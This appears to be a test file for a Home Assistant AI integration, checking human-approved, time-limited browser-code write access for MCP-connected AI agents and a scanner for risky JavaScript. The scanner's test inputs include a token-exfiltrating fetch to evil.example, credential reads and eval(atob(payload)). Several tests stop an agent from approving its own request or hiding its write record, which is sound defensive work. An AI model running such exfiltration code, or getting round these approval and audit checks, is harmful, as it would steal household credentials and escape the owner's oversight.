"""Temporary browser-code access: an agent asks, a person grants from a login.

Drives the real manager, the real ``config_files`` writes and the websocket
handlers against a real ``hass``; only the phone's notify service is a stub.
"""

from __future__ import annotations

from datetime import timedelta
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock

from freezegun.api import FrozenDateTimeFactory
from homeassistant.auth.models import TOKEN_TYPE_LONG_LIVED_ACCESS_TOKEN
from homeassistant.components import persistent_notification
from homeassistant.core import HomeAssistant, ServiceCall
from homeassistant.setup import async_setup_component
import pytest
from pytest_homeassistant_custom_component.common import (
    MockConfigEntry,
    async_fire_time_changed,
)

from custom_components.selora_ai import config_files
from custom_components.selora_ai import file_access as file_access_module
from custom_components.selora_ai.code_findings import analyze, summarize
from custom_components.selora_ai.const import DOMAIN
from custom_components.selora_ai.file_access import (
    EVENT_UPDATED,
    FileAccessError,
    FileAccessManager,
)
from custom_components.selora_ai.helpers import CallerCredential, caller_scope
from custom_components.selora_ai.mcp_service_call import check_service_call
from custom_components.selora_ai.websocket import file_access as ws

AGENT = CallerCredential("mcp_token:t1", "mcp_token", "claude")
OTHER = CallerCredential("mcp_token:t2", "mcp_token", "other")
CARD = (
    "class SeloraHome extends HTMLElement {\n"
    "  press() { this.hass.callService('light', 'toggle', {entity_id: 'light.lamp'}); }\n"
    "}\n"
    "customElements.define('selora-home', SeloraHome);\n"
)


# ── Findings ─────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("code", "kind", "severity"),
    [
        ("fetch('https://evil.example/x?t=' + t)", "network", "high"),
        ("const u = 'https://evil.example/c';", "external_url", "high"),
        ("JSON.parse(localStorage.hassTokens)", "credentials", "high"),
        ("hass.auth.data.access_token", "credentials", "high"),
        ("eval(atob(payload))", "dynamic_code", "high"),
        ("hass.callWS({type: 'config/auth/create'})", "admin_api", "medium"),
        ("hass.callService('lock', 'unlock', {})", "service", "medium"),
        ("hass.callService(domain, service)", "service", "medium"),
        ("hass.callService('light', 'turn_on', {})", "service", "info"),
        ("x = String.fromCharCode(104, 105)", "obfuscation", "medium"),
    ],
)
def test_risky_code_is_named(code: str, kind: str, severity: str) -> None:
    assert any(f["kind"] == kind and f["severity"] == severity for f in analyze(code))


DISPATCHING_CARD = (
    "class Card extends HTMLElement {\n"
    "  _call(domain, service, data) {\n"
    "    return this.hass.callService(domain, service, data);\n"
    "  }\n"
    "  render() {\n"
    "    if (!['scene', 'script'].includes(this.domain)) return;\n"
    "    tile('climate', 'thermometer');\n"
    "    this._call('light', 'turn_on', {entity_id: ids});\n"
    "    this._call('lock', locked ? 'unlock' : 'lock', {entity_id: id});\n"
    "    this._call('cover', openSvc, {entity_id: id});\n"
    "    this._call(domain, 'turn_on', {entity_id: id});\n"
    "  }\n"
    "}\n"
)


def test_actions_called_through_a_helper_are_listed() -> None:
    """A card that calls by variable still names its actions at the helper's calls."""
    services = {
        f["detail"]: f["severity"] for f in analyze(DISPATCHING_CARD) if f["kind"] == "service"
    }
    assert services == {
        "light.turn_on": "info",
        "lock.unlock": "medium",
        "lock.lock": "medium",
        "cover (any action)": "medium",
        # `_call(domain, …)` names nothing: said, not hidden.
        "may also call actions decided while it runs": "info",
    }


def test_a_call_by_variable_with_nothing_named_says_so() -> None:
    [finding] = analyze("hass.callService(domain, service)")
    assert finding["severity"] == "medium"
    assert finding["detail"] == "which actions is decided while it runs; none could be listed"


def test_a_plain_card_has_nothing_risky() -> None:
    findings = analyze(CARD)
    assert summarize(findings) == "no risky patterns"
    assert [f["detail"] for f in findings] == ["light.toggle"]


@pytest.mark.parametrize(
    "code",
    [
        "//this.value = 1; a comment",
        "el.setAttribute('xmlns', 'http://www.w3.org/2000/svg')",
    ],
)
def test_comments_and_namespaces_are_not_addresses(code: str) -> None:
    assert not [f for f in analyze(code) if f["kind"] == "external_url"]


def test_a_repeated_finding_is_counted_once() -> None:
    findings = analyze("fetch(a)\nfetch(b)\nfetch(c)\n")
    assert [(f["detail"], f["line"]) for f in findings] == [("fetch( (×3)", 1)]


# ── Fixtures ─────────────────────────────────────────────────────────────


@pytest.fixture
async def manager(hass: HomeAssistant) -> FileAccessManager:
    Path(hass.config.config_dir, "www").mkdir()
    access = FileAccessManager(hass)
    await access.async_load()
    hass.data.setdefault(DOMAIN, {})["file_access"] = access
    yield access
    await access.async_unload()


@pytest.fixture
def phones(
    hass: HomeAssistant, hass_admin_user: Any, hass_read_only_user: Any
) -> list[ServiceCall]:
    """An admin's phone and a non-admin's, each with its notify service."""
    calls: list[ServiceCall] = []
    for name, user in (("Admin Pixel", hass_admin_user), ("Kid Phone", hass_read_only_user)):
        MockConfigEntry(
            domain="mobile_app", data={"device_name": name, "user_id": user.id}
        ).add_to_hass(hass)
        service = "mobile_app_" + name.lower().replace(" ", "_")
        hass.services.async_register("notify", service, calls.append)
    return calls


async def _write(hass: HomeAssistant, credential: CallerCredential | None, file: str) -> dict:
    with caller_scope(True, credential=credential):
        return await config_files.async_write(hass, file, CARD, overwrite=True)


async def _approve(manager: FileAccessManager, request_id: str, minutes: int = 60) -> dict:
    grant = await manager.async_decide(request_id, True, minutes, "u1", "Philippe")
    assert grant is not None
    return grant


# ── Flow ─────────────────────────────────────────────────────────────────


async def test_browser_code_is_refused_and_points_to_the_request(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    result = await _write(hass, AGENT, "www/selora/selora-home.js")
    assert result["written"] is False
    assert "selora_request_file_access" in result["error"]
    assert not Path(hass.config.config_dir, "www/selora/selora-home.js").exists()


async def test_selora_chat_cannot_ask(manager: FileAccessManager) -> None:
    """No credential means Selora's own chat — the lane most exposed to injection."""
    with pytest.raises(FileAccessError, match="MCP client"):
        await manager.async_request(None, "www/selora", "card", 60)


@pytest.mark.parametrize("folder", ["www", "www/", "themes/x", "www/../x", "www/.hidden"])
async def test_only_a_www_subfolder_can_be_asked_for(
    manager: FileAccessManager, folder: str
) -> None:
    with pytest.raises(FileAccessError):
        await manager.async_request(AGENT, folder, "card", 60)


async def test_a_request_notifies_admin_phones_only(
    hass: HomeAssistant, manager: FileAccessManager, phones: list[ServiceCall]
) -> None:
    result = await manager.async_request(AGENT, "www/selora", "Install the Selora dashboard", 60)
    await hass.async_block_till_done(wait_background_tasks=True)

    assert result["status"] == "pending"
    assert [c.service for c in phones] == ["mobile_app_admin_pixel"]
    link = f"/selora-ai?file_access={result['request_id']}"
    assert phones[0].data["data"]["url"] == link
    assert phones[0].data["data"]["clickAction"] == link
    notifications = persistent_notification._async_get_or_create_notifications(hass)
    notice = notifications[f"selora_file_access_{result['request_id']}"]
    assert link in notice["message"]
    listed = manager.snapshot()["requests"]
    assert [r["id"] for r in listed] == [result["request_id"]]
    assert "credential" not in listed[0]


async def test_asking_again_while_pending_does_not_notify_again(
    hass: HomeAssistant, manager: FileAccessManager, phones: list[ServiceCall]
) -> None:
    first = await manager.async_request(AGENT, "www/selora", "card", 60)
    again = await manager.async_request(AGENT, "www/selora", "card", 60)
    await hass.async_block_till_done(wait_background_tasks=True)
    assert again["request_id"] == first["request_id"]
    assert len(phones) == 1


async def test_a_write_while_pending_says_it_is_waiting(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    await manager.async_request(AGENT, "www/selora", "card", 60)
    result = await _write(hass, AGENT, "www/selora/selora-home.js")
    assert "waiting for the user" in result["error"]


async def test_an_approved_client_writes_into_its_folder_only(
    hass: HomeAssistant, manager: FileAccessManager, phones: list[ServiceCall]
) -> None:
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    await _approve(manager, request["request_id"])
    await hass.async_block_till_done(wait_background_tasks=True)

    written = await _write(hass, AGENT, "www/selora/selora-home.js")
    assert written["written"] is True
    assert written["url"] == "/local/selora/selora-home.js"
    assert written["review"]["summary"] == "no risky patterns"
    assert Path(hass.config.config_dir, "www/selora/selora-home.js").read_text() == CARD

    # The approval cleared the phone's notification.
    assert phones[-1].data == {
        "message": "clear_notification",
        "data": {"tag": f"selora_file_access_{request['request_id']}"},
    }

    assert (await _write(hass, AGENT, "www/other/x.js"))["written"] is False
    assert (await _write(hass, OTHER, "www/selora/x.js"))["written"] is False
    assert (await _write(hass, None, "www/selora/x.js"))["written"] is False

    [grant] = manager.snapshot()["grants"]
    assert [(w["file"], w["action"]) for w in grant["writes"]] == [
        ("www/selora/selora-home.js", "created")
    ]


async def test_rewriting_a_file_keeps_one_entry_with_the_latest_findings(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    await _approve(manager, request["request_id"])
    await _write(hass, AGENT, "www/selora/selora-home.js")
    with caller_scope(True, credential=AGENT):
        result = await config_files.async_write(
            hass, "www/selora/selora-home.js", "fetch('https://evil.example')", overwrite=True
        )
    assert "high" in result["review"]["summary"]

    [write] = manager.snapshot()["grants"][0]["writes"]
    assert write["action"] == "created"
    assert write["times"] == 2
    latest = {f["kind"] for f in write["findings"] if not f.get("earlier")}
    assert latest == {"network", "external_url"}


async def test_a_clean_rewrite_or_a_delete_keeps_what_the_file_did(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    """The bad version may already have run in a browser: replacing or deleting
    it must not erase the record of it."""
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    await _approve(manager, request["request_id"])
    with caller_scope(True, credential=AGENT):
        await config_files.async_write(
            hass, "www/selora/x.js", "fetch('https://evil.example')", overwrite=True
        )
    await _write(hass, AGENT, "www/selora/x.js")

    [write] = manager.snapshot()["grants"][0]["writes"]
    earlier = {f["kind"] for f in write["findings"] if f.get("earlier")}
    assert earlier == {"network", "external_url"}

    with caller_scope(True, credential=AGENT):
        assert (await config_files.async_delete(hass, "www/selora/x.js"))["deleted"]
    [write] = manager.snapshot()["grants"][0]["writes"]
    assert write["action"] == "deleted"
    assert {f["kind"] for f in write["findings"]} >= {"network", "external_url"}


async def test_a_full_record_refuses_new_files_rather_than_forget_old_ones(
    hass: HomeAssistant, manager: FileAccessManager, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A flood of harmless files must not push a flagged one out of the record."""
    monkeypatch.setattr(file_access_module, "_MAX_WRITES_KEPT", 2)
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    await _approve(manager, request["request_id"])
    with caller_scope(True, credential=AGENT):
        await config_files.async_write(
            hass, "www/selora/bad.js", "fetch('https://evil.example')", overwrite=True
        )
    await _write(hass, AGENT, "www/selora/b.js")

    refused = await _write(hass, AGENT, "www/selora/c.js")
    assert refused["written"] is False
    assert not (Path(hass.config.config_dir) / "www/selora/c.js").exists()
    # A file already recorded can still be rewritten.
    assert (await _write(hass, AGENT, "www/selora/b.js"))["written"] is True
    files = [w["file"] for w in manager.snapshot()["grants"][0]["writes"]]
    assert "www/selora/bad.js" in files


async def test_a_denied_request_grants_nothing(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    assert await manager.async_decide(request["request_id"], False, None, "u1", "P") is None
    assert (await _write(hass, AGENT, "www/selora/x.js"))["written"] is False
    with pytest.raises(FileAccessError):
        await manager.async_decide(request["request_id"], True, 60, "u1", "P")


async def test_access_ends_on_time_and_leaves_a_summary(
    hass: HomeAssistant, manager: FileAccessManager, freezer: FrozenDateTimeFactory
) -> None:
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    await _approve(manager, request["request_id"], minutes=15)
    await _write(hass, AGENT, "www/selora/selora-home.js")

    freezer.tick(timedelta(minutes=16))
    async_fire_time_changed(hass)
    await hass.async_block_till_done(wait_background_tasks=True)

    assert (await _write(hass, AGENT, "www/selora/x.js"))["written"] is False
    [grant] = manager.snapshot()["grants"]
    assert grant["ended_reason"] == "expired"
    assert len(grant["writes"]) == 1

    await manager.async_dismiss(grant["id"])
    assert manager.snapshot()["grants"] == []


async def test_expiry_holds_even_if_the_timer_never_fired(
    hass: HomeAssistant, manager: FileAccessManager, freezer: FrozenDateTimeFactory
) -> None:
    """The timer is for notifications; the expiry itself is checked on every write."""
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    await _approve(manager, request["request_id"], minutes=15)
    freezer.tick(timedelta(minutes=16))
    assert (await _write(hass, AGENT, "www/selora/x.js"))["written"] is False


async def test_an_unanswered_request_lapses(
    hass: HomeAssistant, manager: FileAccessManager, freezer: FrozenDateTimeFactory
) -> None:
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    freezer.tick(timedelta(minutes=16))
    async_fire_time_changed(hass)
    await hass.async_block_till_done(wait_background_tasks=True)
    assert manager.snapshot()["requests"] == []
    with pytest.raises(FileAccessError):
        await manager.async_decide(request["request_id"], True, 60, "u1", "P")


async def test_revoking_ends_access_at_once(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    await _approve(manager, request["request_id"])
    grant = await manager.async_revoke(request["request_id"])
    assert grant["ended_reason"] == "revoked"
    assert (await _write(hass, AGENT, "www/selora/x.js"))["written"] is False


async def test_requests_are_rate_limited(manager: FileAccessManager) -> None:
    for i in range(3):
        request = await manager.async_request(AGENT, f"www/card{i}", "card", 60)
        await manager.async_decide(request["request_id"], False, None, "u1", "P")
    with pytest.raises(FileAccessError, match="Too many"):
        await manager.async_request(AGENT, "www/card9", "card", 60)


async def test_every_change_is_announced_to_the_panel(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    events: list[Any] = []
    hass.bus.async_listen(EVENT_UPDATED, events.append)
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    await _approve(manager, request["request_id"])
    await _write(hass, AGENT, "www/selora/selora-home.js")
    await hass.async_block_till_done(wait_background_tasks=True)
    assert len(events) == 3


# ── Restart ──────────────────────────────────────────────────────────────


async def test_a_grant_and_its_record_survive_a_restart(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    """An agent may restart Home Assistant after installing something."""
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    await _approve(manager, request["request_id"])
    await _write(hass, AGENT, "www/selora/selora-home.js")
    await manager.async_unload()

    restarted = FileAccessManager(hass)
    await restarted.async_load()
    hass.data[DOMAIN]["file_access"] = restarted
    try:
        assert (await _write(hass, AGENT, "www/selora/vendor.js"))["written"] is True
        [grant] = restarted.snapshot()["grants"]
        assert sorted(w["file"] for w in grant["writes"]) == [
            "www/selora/selora-home.js",
            "www/selora/vendor.js",
        ]
    finally:
        await restarted.async_unload()


async def test_a_grant_that_lapsed_while_down_ends_at_startup(
    hass: HomeAssistant, manager: FileAccessManager, freezer: FrozenDateTimeFactory
) -> None:
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    await _approve(manager, request["request_id"], minutes=15)
    await manager.async_unload()
    freezer.tick(timedelta(hours=2))

    restarted = FileAccessManager(hass)
    await restarted.async_load()
    try:
        [grant] = restarted.snapshot()["grants"]
        assert grant["ended_reason"] == "expired"
        assert restarted.grant_for(AGENT, "www/selora/x.js") is None
    finally:
        await restarted.async_unload()


# ── Websocket ────────────────────────────────────────────────────────────


async def _ws(
    hass: HomeAssistant, handler: Any, msg: dict, user: Any, token_type: str | None
) -> MagicMock:
    connection = MagicMock()
    connection.user = user
    connection.refresh_token_id = None
    if token_type is not None:
        kwargs: dict[str, Any] = {"token_type": token_type}
        if token_type == TOKEN_TYPE_LONG_LIVED_ACCESS_TOKEN:
            kwargs["client_name"] = "agent"
        else:
            kwargs["client_id"] = "https://example.com/"
        token = await hass.auth.async_create_refresh_token(user, **kwargs)
        connection.refresh_token_id = token.id
    # HA leaves `_ws_schema` False for a command that takes only `type`.
    schema = handler._ws_schema
    await handler.__wrapped__(
        hass, connection, schema({"id": 1, **msg}) if schema else {"id": 1, **msg}
    )
    return connection


async def test_a_long_lived_token_cannot_approve(
    hass: HomeAssistant, manager: FileAccessManager, hass_admin_user: Any
) -> None:
    """An agent connected with the user's token would approve its own request."""
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    msg = {
        "type": "selora_ai/file_access/decide",
        "request_id": request["request_id"],
        "approve": True,
    }

    connection = await _ws(
        hass, ws._handle_decide, msg, hass_admin_user, TOKEN_TYPE_LONG_LIVED_ACCESS_TOKEN
    )
    assert connection.send_error.call_args[0][1] == "login_session_required"
    assert manager.grant_for(AGENT, "www/selora/x.js") is None

    connection = await _ws(hass, ws._handle_decide, msg, hass_admin_user, "normal")
    assert "grant" in connection.send_result.call_args[0][1]
    assert manager.grant_for(AGENT, "www/selora/x.js") is not None


async def test_a_long_lived_token_cannot_dismiss_the_record(
    hass: HomeAssistant, manager: FileAccessManager, hass_admin_user: Any
) -> None:
    """Dismissing hides what the agent wrote; the agent must not do it."""
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    await _approve(manager, request["request_id"])
    await manager.async_revoke(request["request_id"])
    msg = {"type": "selora_ai/file_access/dismiss", "grant_id": request["request_id"]}

    connection = await _ws(
        hass, ws._handle_dismiss, msg, hass_admin_user, TOKEN_TYPE_LONG_LIVED_ACCESS_TOKEN
    )
    assert connection.send_error.call_args[0][1] == "login_session_required"
    assert manager.snapshot()["grants"]

    connection = await _ws(hass, ws._handle_dismiss, msg, hass_admin_user, "normal")
    assert connection.send_result.call_args[0][1] == {"ok": True}
    assert not manager.snapshot()["grants"]


@pytest.mark.parametrize(
    ("service", "data"),
    [
        ("persistent_notification.dismiss", {"notification_id": "selora_file_access_ended_g1"}),
        ("persistent_notification.dismiss", {"notification_id": "selora_file_access_r1"}),
    ],
)
async def test_an_agent_cannot_dismiss_the_access_notifications(
    hass: HomeAssistant, service: str, data: dict
) -> None:
    await async_setup_component(hass, "persistent_notification", {})
    verdict = check_service_call(hass, service, None, data, confirmed=True)
    assert not verdict["valid"]
    assert "only a person dismisses them" in verdict["errors"][0]


async def test_other_notifications_can_still_be_dismissed(hass: HomeAssistant) -> None:
    await async_setup_component(hass, "persistent_notification", {})
    verdict = check_service_call(
        hass, "persistent_notification.dismiss", None, {"notification_id": "x"}, confirmed=True
    )
    assert verdict["valid"]


async def test_a_non_admin_cannot_list_or_approve(
    hass: HomeAssistant, manager: FileAccessManager, hass_read_only_user: Any
) -> None:
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    for handler, msg in (
        (ws._handle_list, {"type": "selora_ai/file_access/list"}),
        (
            ws._handle_decide,
            {
                "type": "selora_ai/file_access/decide",
                "request_id": request["request_id"],
                "approve": True,
            },
        ),
    ):
        connection = await _ws(hass, handler, msg, hass_read_only_user, "normal")
        assert connection.send_error.call_args[0][1] == "admin_required"
    assert manager.grant_for(AGENT, "www/selora/x.js") is None


async def test_the_list_says_which_files_a_dashboard_loads(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    """The panel explains a file by whether a dashboard resource loads it."""
    request = await manager.async_request(AGENT, "www/selora", "card", 60)
    await _approve(manager, request["request_id"])
    await _write(hass, AGENT, "www/selora/selora-home.js")
    await _write(hass, AGENT, "www/selora/vendor/lit-core.min.js")

    listed = ws._with_loaded(manager.snapshot(), {"/local/selora/selora-home.js"})
    loaded = {w["file"]: w["loaded"] for w in listed["grants"][0]["writes"]}
    assert loaded == {
        "www/selora/selora-home.js": True,
        "www/selora/vendor/lit-core.min.js": False,
    }
    # The stored record is untouched, and unreadable resources say nothing.
    assert all("loaded" not in w for w in manager.snapshot()["grants"][0]["writes"])
    unknown = ws._with_loaded(manager.snapshot(), None)
    assert all("loaded" not in w for w in unknown["grants"][0]["writes"])


# ── Installers ───────────────────────────────────────────────────────────

INSTALLER = CallerCredential(
    "selora_jwt:user:9:session:42",
    "selora_account",
    "Tech",
    "Claude",
    support_session=42,
    email="Tech@Installer.example",
)


async def _support_user(hass: HomeAssistant, email: str = "tech@installer.example") -> Any:
    """The HA user an installer signs in as during a support session."""
    from homeassistant.auth.models import Credentials

    user = await hass.auth.async_create_user("Tech", group_ids=["system-admin"])
    await hass.auth.async_link_user(
        user,
        Credentials(
            auth_provider_type="command_line",
            auth_provider_id="selora_support",
            data={"username": email},
            is_new=False,
        ),
    )
    return user


async def test_an_installer_request_notifies_nobody_in_the_home(
    hass: HomeAssistant, manager: FileAccessManager, phones: list[ServiceCall]
) -> None:
    """The installer is in the chat with their AI: the link goes there instead."""
    remote = Path(hass.config.path(".selora"))
    remote.mkdir()
    (remote / "remote_url.json").write_text('{"remote_url": "https://abc-def.selorabox.com"}')

    result = await manager.async_request(INSTALLER, "www/selora", "card", 60)
    await hass.async_block_till_done(wait_background_tasks=True)

    assert phones == []
    notifications = persistent_notification._async_get_or_create_notifications(hass)
    assert not [n for n in notifications if n.startswith("selora_file_access")]
    assert result["approve_url"] == (
        f"https://abc-def.selorabox.com/selora-ai?file_access={result['request_id']}"
    )
    assert "approve_url" in result["next"]


async def test_only_the_installers_support_user_sees_and_answers_it(
    hass: HomeAssistant, manager: FileAccessManager, hass_admin_user: Any
) -> None:
    request = await manager.async_request(INSTALLER, "www/selora", "card", 60)
    installer = await _support_user(hass)
    other_installer = await _support_user(hass, "someone@else.example")
    listing = {"type": "selora_ai/file_access/list"}
    decide = {
        "type": "selora_ai/file_access/decide",
        "request_id": request["request_id"],
        "approve": True,
    }

    for user in (hass_admin_user, other_installer):
        connection = await _ws(hass, ws._handle_list, listing, user, "normal")
        assert connection.send_result.call_args[0][1]["requests"] == []
        connection = await _ws(hass, ws._handle_decide, decide, user, "normal")
        assert connection.send_error.call_args[0][1] == "not_found"
    assert manager.grant_for(INSTALLER, "www/selora/x.js") is None

    connection = await _ws(hass, ws._handle_list, listing, installer, "normal")
    [listed] = connection.send_result.call_args[0][1]["requests"]
    assert "support_email" not in listed
    connection = await _ws(hass, ws._handle_decide, decide, installer, "normal")
    assert "grant" in connection.send_result.call_args[0][1]
    assert manager.grant_for(INSTALLER, "www/selora/x.js") is not None

    # The home's own requests stay every admin's.
    own = await manager.async_request(AGENT, "www/other", "card", 60)
    connection = await _ws(hass, ws._handle_list, listing, hass_admin_user, "normal")
    assert [r["id"] for r in connection.send_result.call_args[0][1]["requests"]] == [
        own["request_id"]
    ]


async def test_the_installers_access_ends_with_the_support_session(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    request = await manager.async_request(INSTALLER, "www/selora", "card", 60)
    installer = await _support_user(hass)
    await manager.async_decide(request["request_id"], True, 60, installer.id, "Tech")
    assert (await _write(hass, INSTALLER, "www/selora/selora-home.js"))["written"]

    await hass.auth.async_remove_user(installer)
    await hass.async_block_till_done(wait_background_tasks=True)

    [grant] = manager.snapshot()["grants"]
    assert grant["ended_reason"] == "session_ended"
    assert manager.grant_for(INSTALLER, "www/selora/x.js") is None
    assert not (await _write(hass, INSTALLER, "www/selora/selora-home.js"))["written"]
    # No alert in the home: the record stays in storage and the log.
    notifications = persistent_notification._async_get_or_create_notifications(hass)
    assert not [n for n in notifications if n.startswith("selora_file_access")]


async def test_an_installers_session_is_reported_to_connect(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    """What was asked, who answered, and each file written, against the session."""
    import hashlib
    import json

    from custom_components.selora_ai.support_activity import outbox_path

    request = await manager.async_request(INSTALLER, "www/selora", "card", 30)
    installer = await _support_user(hass)
    await manager.async_decide(request["request_id"], True, 30, installer.id, "Tech")
    await _write(hass, INSTALLER, "www/selora/selora-home.js")
    with caller_scope(True, credential=INSTALLER):
        await config_files.async_delete(hass, "www/selora/selora-home.js")
    await manager.async_revoke(request["request_id"])
    await hass.async_block_till_done(wait_background_tasks=True)

    events = [json.loads(p.read_text()) for p in sorted(outbox_path(hass).glob("*.json"))]
    assert [(e["type"], e.get("action")) for e in events] == [
        ("access_requested", None),
        ("access_granted", None),
        ("file_written", "created"),
        ("file_written", "deleted"),
        ("access_ended", None),
    ]
    assert {e["session_id"] for e in events} == {42}
    assert {e["request_id"] for e in events} == {request["request_id"]}
    written = events[2]
    assert written["sha256"] == hashlib.sha256(CARD.encode()).hexdigest()
    assert [f["detail"] for f in written["findings"]] == ["light.toggle"]
    # The deletion reports itself, not the version it removed.
    assert events[3]["findings"] == []
    assert events[1]["answered_by"] == "Tech"
    assert events[4]["reason"] == "revoked"


async def test_the_homes_own_access_is_not_reported(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    from custom_components.selora_ai.support_activity import outbox_path

    request = await manager.async_request(AGENT, "www/selora", "card", 30)
    await _approve(manager, request["request_id"])
    await _write(hass, AGENT, "www/selora/selora-home.js")
    await hass.async_block_till_done(wait_background_tasks=True)
    assert not outbox_path(hass).exists()


async def test_a_support_token_without_an_email_cannot_ask(
    manager: FileAccessManager,
) -> None:
    nameless = INSTALLER._replace(email=None)
    with pytest.raises(FileAccessError, match="no email"):
        await manager.async_request(nameless, "www/selora", "card", 60)


async def test_an_installer_is_bound_to_one_support_session(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    """A grant made in one session must not carry over to the next."""
    import json

    from custom_components.selora_ai.mcp_server.dispatch import _dispatch
    from custom_components.selora_ai.mcp_server.names import TOOL_REQUEST_FILE_ACCESS
    from custom_components.selora_ai.selora_auth import SeloraAuthContext

    def auth(session: int) -> SeloraAuthContext:
        return SeloraAuthContext(
            user_id="user:9",
            email="Tech@Installer.example",
            is_admin=False,
            auth_type="selora_jwt",
            scopes=frozenset({"mcp:write"}),
            session_id=session,
        )

    first, second = [
        json.loads(
            (
                await _dispatch(
                    hass,
                    TOOL_REQUEST_FILE_ACCESS,
                    {"folder": "www/selora", "reason": "card"},
                    auth_ctx=auth(session),
                )
            )[0].text
        )
        for session in (1, 2)
    ]
    assert first["request_id"] != second["request_id"]
    stored = manager._requests[first["request_id"]]
    assert stored["credential"] == "selora_jwt:user:9:session:1"
    assert stored["support_email"] == "tech@installer.example"
    assert first["approve_url"].endswith(f"/selora-ai?file_access={first['request_id']}")


# ── MCP ──────────────────────────────────────────────────────────────────


async def test_the_mcp_tool_binds_the_request_to_the_calling_token(
    hass: HomeAssistant, manager: FileAccessManager, hass_admin_user: Any
) -> None:
    import json

    from custom_components.selora_ai.mcp_server.dispatch import _dispatch
    from custom_components.selora_ai.mcp_server.names import TOOL_REQUEST_FILE_ACCESS
    from custom_components.selora_ai.selora_auth import SeloraAuthContext

    auth = SeloraAuthContext(
        user_id=hass_admin_user.id,
        email=None,
        is_admin=True,
        auth_type="mcp_token",
        token_id="tok123",
    )
    [content] = await _dispatch(
        hass,
        TOOL_REQUEST_FILE_ACCESS,
        {"folder": "www/selora", "reason": "Install the dashboard"},
        auth_ctx=auth,
    )
    result = json.loads(content.text)
    assert result["status"] == "pending"
    assert manager._requests[result["request_id"]]["credential"] == "mcp_token:tok123"


async def test_a_selora_login_is_named_without_its_internal_id(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    """A homeowner does not know their account id; 'user:2' told them nothing."""
    import json

    from custom_components.selora_ai.mcp_server.dispatch import _dispatch
    from custom_components.selora_ai.mcp_server.names import TOOL_REQUEST_FILE_ACCESS
    from custom_components.selora_ai.selora_auth import SeloraAuthContext

    auth = SeloraAuthContext(
        user_id="user:2",
        email=None,
        is_admin=True,
        auth_type="selora_jwt",
        scopes=frozenset({"mcp:write"}),
    )
    [content] = await _dispatch(
        hass, TOOL_REQUEST_FILE_ACCESS, {"folder": "www/selora", "reason": "card"}, auth_ctx=auth
    )
    [request] = manager.snapshot()["requests"]
    assert json.loads(content.text)["status"] == "pending"
    assert request["agent_kind"] == "selora_account"
    assert request["agent_name"] is None
    assert "user:2" not in request["agent"]
    assert request["agent"] == "An AI assistant connected with your Selora account"


async def test_a_selora_login_is_named_by_the_name_connect_sends(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    from custom_components.selora_ai.mcp_server.dispatch import _dispatch
    from custom_components.selora_ai.mcp_server.names import TOOL_REQUEST_FILE_ACCESS
    from custom_components.selora_ai.selora_auth import SeloraAuthContext

    auth = SeloraAuthContext(
        user_id="user:2",
        email="p@example.com",
        is_admin=True,
        auth_type="selora_jwt",
        scopes=frozenset({"mcp:write"}),
        name="Philippe",
    )
    await _dispatch(
        hass, TOOL_REQUEST_FILE_ACCESS, {"folder": "www/selora", "reason": "card"}, auth_ctx=auth
    )
    [request] = manager.snapshot()["requests"]
    assert request["agent_name"] == "Philippe"
    assert request["agent"] == "An AI assistant signed in as Philippe"


# ── Which app asks ───────────────────────────────────────────────────────


def _selora_login() -> Any:
    from custom_components.selora_ai.selora_auth import SeloraAuthContext

    return SeloraAuthContext(
        user_id="user:2",
        email=None,
        is_admin=True,
        auth_type="selora_jwt",
        scopes=frozenset({"mcp:write"}),
    )


async def _ask_as(hass: HomeAssistant, user_agent: str, folder: str) -> dict:
    from custom_components.selora_ai.mcp_server.dispatch import _jsonrpc_dispatch
    from custom_components.selora_ai.mcp_server.names import TOOL_REQUEST_FILE_ACCESS

    await _jsonrpc_dispatch(
        hass,
        "tools/call",
        {"name": TOOL_REQUEST_FILE_ACCESS, "arguments": {"folder": folder, "reason": "card"}},
        _selora_login(),
        user_agent=user_agent,
    )
    requests = hass.data[DOMAIN]["file_access"].snapshot()["requests"]
    return next(r for r in requests if r["folder"] == folder)


async def _initialize(hass: HomeAssistant, user_agent: str, client: str) -> None:
    from custom_components.selora_ai.mcp_server.dispatch import _jsonrpc_dispatch

    await _jsonrpc_dispatch(
        hass,
        "initialize",
        {"clientInfo": {"name": client, "version": "1.0"}},
        _selora_login(),
        user_agent=user_agent,
    )


async def test_two_apps_on_one_account_are_told_apart(
    hass: HomeAssistant, manager: FileAccessManager
) -> None:
    """One owner per home, so the account says nothing; the app is what matters."""
    await _initialize(hass, "openai-mcp/1.0.0", "openai-mcp")
    await _initialize(hass, "Claude-User", "claude-ai")

    chatgpt = await _ask_as(hass, "openai-mcp/1.0.0", "www/a")
    claude = await _ask_as(hass, "Claude-User", "www/b")

